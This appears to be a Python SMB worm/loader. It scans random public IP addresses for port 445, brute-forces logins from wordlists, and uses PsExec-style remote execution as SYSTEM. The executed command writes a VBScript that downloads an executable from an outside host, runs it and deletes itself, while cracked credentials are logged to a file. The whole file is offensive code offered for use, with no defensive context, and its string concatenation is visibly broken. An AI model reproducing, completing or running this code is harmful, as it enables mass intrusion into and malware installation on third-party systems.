import os
from pypsexec.client import Client
import socket
import time
import threading
import itertools
import random
fh1=open("user.txt", "r")
fh2=open("passw0rd.txt", "r")
users=fh1.read().replace("\r", "").split("\n")
passwords=fh2.read().replace("\r", "").split("\n")
fh1.close()
fh2.close()
host = "your.domain"
file = "file.exe"
global maxthreadsglobal
maxthreadsglobal=854
global globalthreads
globalthreads = 0
def testPW(ip, user, passwd, fh):
    global globalthreads
    globalthreads += 1
    try:
        c = Client(ip, username=user, password=passwd)
        c.connect()
        try:
            c.create_service()
            # run a simple cmd.exe program with arguments
            stdout, stderr, rc = c.run_executable("cmd.exe",
                                                  arguments="/q /c cd %tmp%&echo Set Nk=CreateObject(\"Microsoft.XMLHTTP\"):Nk.Open \"GET\",\"http://"+host"/"+file"\",False:Nk.Send:Set KS=CreateObject(\"ADODB.Stream\"):KS.Type=1:KS.Open:KS.Write Nk.responseBody:KS.SaveToFile \"oE.exe\",2:CreateObject(\"WScript.Shell\").Run \"oE.exe\":CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"P.vbs\" >P.vbs&start wscript P.vbs",
                                                  use_system_account=True)
            print("~~~ ----> " + ip + ":" + user + ":" + passwd)
            fh.write("~~~ ----> " + ip + ":" + user + ":" + passwd + "\r\n")
            globalthreads -= 1
            return True
        finally:
            c.remove_service()
            c.disconnect()
            print("T3ST3D ----> " + ip + ":" + user + ":" + passwd)
            globalthreads -= 1
            return False
    except:
        print("T3ST3D ----> " + ip + ":" + user + ":" + passwd)
        globalthreads -= 1
        return False
    globalthreads -= 1
    return False
def brute(ip, fh):
    global maxthreadsglobal
    global globalthreads
    print("BRUT1NG ----> " + ip)
    threads = 0
    maxthreads = 10
    for user in users:
        for passwd in passwords:
            threads += 1
            if threads == maxthreads or globalthreads >= maxthreadsglobal:
                t.join()
                time.sleep(random.randrange(1,10))
                threads = 0
            try:
                t=threading.Thread(target=testPW, args=(ip, user, passwd, fh,))
                t.start()
            except:
                time.sleep(random.randrange(1,10))
                try:
                    t=threading.Thread(target=testPW, args=(ip, user, passwd, fh,))
                    t.start()
                except:
                    pass
def Scan(IP):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((IP, 445))
        s.close()
        return True
    except:
        return False
 
def gen_IP():
    not_valid = [10,127,169,172,192,185]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip
 
def gen_IP_block():
    not_valid = [10,127,169,172,192,185]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256))])
    return ip+".0-255"
 
def ip_range(input_string):
    octets = input_string.split('.')
    chunks = [map(int, octet.split('-')) for octet in octets]
    ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]
 
    for address in itertools.product(*ranges):
        yield '.'.join(map(str, address))
def HaxThread(fh):
    while 1:
        try:
            IP = gen_IP()
            if Scan(IP):
                if Scan('.'.join(IP.split(".")[:3])+".2") and Scan('.'.join(IP.split(".")[:3])+".254"):#entire ip range most likely pointed to one server
                    brute(IP,fh)
                    continue
                else:
                    for IP in ip_range('.'.join(IP.split(".")[:3])+".0-255"):
                        if Scan(IP):
                            brute(IP,fh)
        except Exception as e:
            print(str(e))
            pass
 
threads = int(raw_input("Threads: "))
 
fh = open("smb_vulnz.txt","a")
threadcount = 0
for i in xrange(0,threads):
    try:
        threading.Thread(target=HaxThread, args=(fh,)).start()
        threadcount += 1
    except:
        pass
print("[*] Started with " + str(threadcount) + " scanner threads!")
print("Scanning... Press enter 3 times to stop.")
 
for i in range(0,3):
    input()
 
os.kill(os.getpid(),9)